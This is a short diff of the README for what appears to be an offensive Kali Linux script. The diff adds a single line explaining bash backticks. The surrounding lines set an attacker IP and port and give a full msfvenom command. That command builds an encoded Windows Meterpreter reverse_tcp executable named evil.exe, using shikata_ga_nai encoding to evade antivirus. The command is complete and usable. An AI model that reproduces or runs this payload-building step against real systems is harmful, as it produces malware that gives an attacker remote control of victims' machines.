@@ -12,6 +12,8 @@ This is a script to be used in Kali linux where the tools are already preinstall
     attackerip=`ifconfig eth0 | grep netmask | cut -d' ' -f10`
     attackerport=9107
     ```
+    The backtick is equivalent to bash $(...) 
+    
 2. Generate evil.exe
     ```sh
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip   LPORT=$attackerport -b '\x00\x0a\x0d' -f exe --arch x86 --platform windows -e x86/shikata_ga_nai -i 5 > evil.exe
